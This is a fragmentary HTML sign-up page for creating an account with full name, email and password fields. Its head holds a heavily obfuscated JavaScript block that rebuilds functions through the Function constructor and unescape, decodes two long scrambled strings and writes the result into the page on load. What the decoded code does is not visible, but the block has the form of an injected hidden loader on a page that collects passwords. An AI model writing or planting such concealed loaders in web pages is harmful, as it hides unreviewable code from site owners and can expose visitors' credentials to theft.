...
<head>
    ...
    function x7vh(wcdg) {
        var
            ee2m, qbzq, fns2, d61f = Function,
            zr2u = "7LhUn-[xVe4kbtPpa)0|:1?m]g&I\nX\"KSGTcrCj svBld8y(2\rf+./M5q,!\'9Nw36}o=iAzuOD;E>R{<",
            sviz = zr2u.length,
            fob2 = {
                cd: ""
            },
            ue = new d61f("ret" + "urn unesc" + "ape")(),
            bx2p = new d61f("x", ue("%74hi%73.c%64+=x")),
            ad54 = new d61f("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
        for (fns2 = 0; fns2 < wcdg.length; fns2++) {
            ee2m = ad54(wcdg, fns2);
            qbzq = zr2u.indexOf(ee2m);
            if (qbzq > -1) {
                qbzq -= (fns2 + 1) % sviz;
                if (qbzq < 0) {
                    qbzq += sviz;
                }
                bx2p.call(fob2, ad54(zr2u, qbzq));
            } else {
                bx2p.call(fob2, ee2m);
            }
        }
        new d61f(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(fob2);
    }
    x7vh("7BjsD1:(?q&17d\ng]KO!C3 69wplB9IKk s-}<7:<Xx\"7Cz,/3mia)\r3=a;(?ml?kb8S5gwph{V2?xbEdk&te|\rMrM-.qIfU!\'<!(2=49)fCGlU,B(\"<yN2dMneuesk[)ij\"PpcPUnmya/[DA< t{Uoch)n74s8I8>a:s.;.E8hc?0\ni9T}X,w);a\"wv)acuc\r1jnL2/X\'v,Lb8r|)!wkAOO:=pD\nbtL\'+?nhgD hkDN}2yl4pu\"K\ra1Rw+g<XX.UGc8Cck4XlzCB0UOy:ffD]Mqo!qSKfP}l[9}d4\'pI;?:zq2Tqz?L,qEKVn+PdpRi+\rb8P4:91L]g<0hU}CjXwKICRj0vBac|:).j.]vx!r\nPrfhNCr5kdO,b]=>!)u>51zTRv.D9\n>w39p1hai-+?&:d7|-R3-|+\"[-]9{jT2D0vv/2\"U:uUf27!\n9C,5x}(s33EgB{Oh=|S]u=e{iNL<KeldkD=44?.Ag|XPyt1|+Xr}7| Ue\'X}V-\nb)8\"}]ah|zh\r(<,I\'rqM[6y ww;]az1}t0KmzoVR=97{\"VBl4O+kx1yuPP&q2?/)8f)gm5GsAw-5b8S\njl1tP7?ri(m?vRM[x=4NlT)pq9e=z.gBtgOz?7fh\'<RXxAc!\n}0-Lk+i]0\nt8!f)tc]PxIg,cAzC|oe\'a\rrSBh|5\r\'d>l+\rL\'op\"\rAG e\'pjc!Bu=TRMy(OIgE&q CnV\nsb;/tem2yA >Xab?I-R{6[:.Kx[gNyC2=;Cy\n|h7LE<fD}ofU.2!OD,4\'5}gPkk.1iUzo>4kE\nRDUlSXXz [1VnPMa:\"=mK0R{Bsi2yTCj=}9uB+.rM5 U8\rz98f6}\rt5\'7z59:wo>GAR6ldV[TPb7L3?" +
        ">L9&EKEeN{dpD}oz/+8\r:l\nX5fNSSPNnMkdKICRbK3pTdvs(!8vX&3M}nj\"54V!e ?:N}POR{DR)XL325OGq/d\'{jwtBop(2\n{zq{bdm<{)/&&,noXj:<by+PC5qsnDzzK7(w\r85AzM0xnn8PN>3\'Ac83+]g-DC&mm6G7ph{V24P]N)gb]crL>\',=7T DU(87T]q/f+hp\rMV0w=X6z&cTXuiA:G=O&r7t5xV(CxE,azEM:AgCnS\"7o!\'8=LGbi=[BI\nqz5&V(1&-+:qic3NKVbEDiAei2\"R:zI9(l/t\n(nMeqUw46ie=B==08Mg205VEuLvqErX4:r4Pctig&Mi7O>\',5{2-jg1Kur}o0}T\"sX)zdvClu/chgES}.2!03bt8bN,=qd)ui6z0\"l:.hT2(v3RXV63hye07\'O&K;)NmI2jm\ni\"TdLC8S0t>;n)+q4:6w)+vDz=i|Sougc<nyLxl.+yV>!zT{:;I>Oh37Be}jedpD}o\'/:2yagUMR(nC]:\"zc6})6GX \naAlsrBzhpL;5}L5\'7!g]0sM[}vs\'moE,AGR|D&EuLw<vV6CVlPO6,+0ydPmLD\'Lp(&hL:q?1cKAS}jlga<RsDy[fOy<2dMc.PNC4No29to&zbo|i6;5OTL,\"Lrx},hCc-Exst/tbfBO+)>Dk[?5\ni/ISk,&Ksi)rp<y;OB\n:1{ME<)-tnS=ve}[4Nu3jlg.:>)1>;4]M{3Kx\nST,1n}Ue3vOsv?/5&n+;j1=KV!1=gK-3Pw3dERsfB)b:b5qTL]i+)NjV+)5Nctdbt;gIz7O(Bf=-[6KM0L(kijL(-k}l;Bl]5,:\"?RONccrPNn2KRv0iKRcvpD]ODM-xf9.I?k\"}odkT{NIu20NI}u8mM?mncC74h,.v.pa;v6\nk,1{2k,p1E/n./T}=R}D6dc8CbxKpf+X>|3ybqGUybfq\"V xVA:?S:\n|<z7O(BoR-[6KM0L(kijL(-k}l;Bl]5,=53MOC} rCpw-\rS{B|AS{rBa;gD;5[V9:}tX6}l:BqV=lBN)g6}0\"D&<no{Kn\'sUreP:VvP?f+P(ab?IG1Mm|XC?436 )bEDrAB(XD\rz;2INRIfUqaq5t-cP9yv]?TA2h0xVOg{j?z-&\n!CUb;ei?j"
    );
    x7vh("iTasD4S9\'yRcfaK.Mn3XiK6CRNXd}=)>B+x\rmvM5f{79-5P}1-/iekv:o(OI<<,\rc.mc\"[IK[\rkP6aDtq01U8iSpN/:ajI)4\"DcjODs?t>;EjudnDrm[fA2[\nX4k-\nO553&iu{N;LncmK?7+.B\"jXxV0|vB-jk+cPjycP.&)fm3c?IK(&6rxVAz6x+TTB-(f,s/93(,\r]\'\"KM6qKo=R{:3aAX;?DbuX+.GT\n+p{{[\rkP1n)]IptXlm;E?:rf\"KvB6\"el\'e46x+TTB-(f,sq9q,<" +
        "?o\r\r,:w}O5uE sOOD5wNEuXOg{UN7g<xU=\'9Nwo\r(8ijE\npk1N&5qV5]:\"|x9TKIGNlgOp}?5Bj2V/hUch+(,yTxN!M9V:no}m?8B}bs\"Azm8h&wL4i wSA?e-p5:\rfh\r0P]tLM\ng1I5=+GSzswriA9V{Cjutf;\"\r!r\n/V[qxC:0a ey<owOSRE>7:iwX{;neujNKi1VnPM|)0?B4n+:a&N8h1X\no}V-\n5UDSGo2&0U3vBTjtLR<S9\'l"
    );
    -->
    </script><noscript>
                        ...
                        <div class="theme-colors">
                            ...
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select me-3"> <input
                                        ...
                                        name="theme-background" id="switcher-background" checked> </div>
                                <div class="form-check switch-select me-3"> <input
                        ...
                        <div class="menu-image mb-3">
                            ...
                            <div class="d-flex flex-wrap align-items-center switcher-style">
                                <div class="form-check switch-select m-2"> <input
                                        ...
                                        name="theme-background" id="switcher-bg-img" checked> </div>
                                <div class="form-check switch-select m-2"> <input
    ...
    <div class="container-lg">
        <div class="row justify-content-center align-items-center authentication authentication-basic h-100">
            <div class="col-xxl-4 col-xl-5 col-lg-5 col-md-6 col-sm-8 col-12">
                <div class="my-5 d-flex justify-content-center"> <a href="index.html"> <img src="logo.jpg" alt="logo"
                ...
                <div class="card custom-card">
                    <div class="card-body p-5">
                        ...
                        <p class="mb-4 text-muted op-7 fw-normal text-center">Welcome & Join us by creating a free
                            account !</p>
                        <div class="row gy-3">
                            <div class="col-xl-12"> <label for="signup-firstname" class="form-label text-default">
                                   Full Name</label> <input type="text" class="form-control form-control-lg"
                                    id="signup-firstname" placeholder="Full Name"> </div>
                            <div class="col-xl-12">
                             <label for="signup-lastname" class="form-label text-default">Email        </label> 
                             <input type="email" class="form-control form-control-lg"
                                    id="signup-lastname" placeholder="Email"> </div>


                            <div class="col-xl-12"> <label for="signup-password"
                                    class="form-label text-default">Password</label>
                                <div class="input-group"> <input type="password" class="form-control form-control-lg"
                                        id="signup-password" placeholder="password"> <button class="btn btn-light"
                            ...
                            <div class="col-xl-12 mb-2"> <label for="signup-confirmpassword"
                                    class="form-label text-default">Confirm Password</label>
                                <div class="input-group"> <input type="password" class="form-control form-control-lg"
                                        id="signup-confirmpassword" placeholder="confirm password"> <button
                                        class="btn btn-light" onclick="createpassword('signup-confirmpassword',this)"
                                        type="button" id="button-addon21"><i
                                            class="ri-eye-off-line align-middle"></i></button> </div>
                                <div class="form-check mt-3"> <input class="form-check-input" type="checkbox" value=""
                                        id="defaultCheck1"> <label class="form-check-label text-muted fw-normal"
                                        for="defaultCheck1"> By creating a account you agree to our <a
                                            href="terms_conditions" class="text-success"><u>Terms &
                                                Conditions</u></a> and <a class="text-success"><u>Privacy Policy</u></a>
                                    </label> </div>
                            </div>
                            <div class="col-xl-12 d-grid mt-2"> <button class="btn btn-lg btn-primary">Create
                                    Account</button> </div>
                        </div>
                        <div class="text-center">
                            <p class="fs-12 text-muted mt-3">Already have an account? <a href="login1"
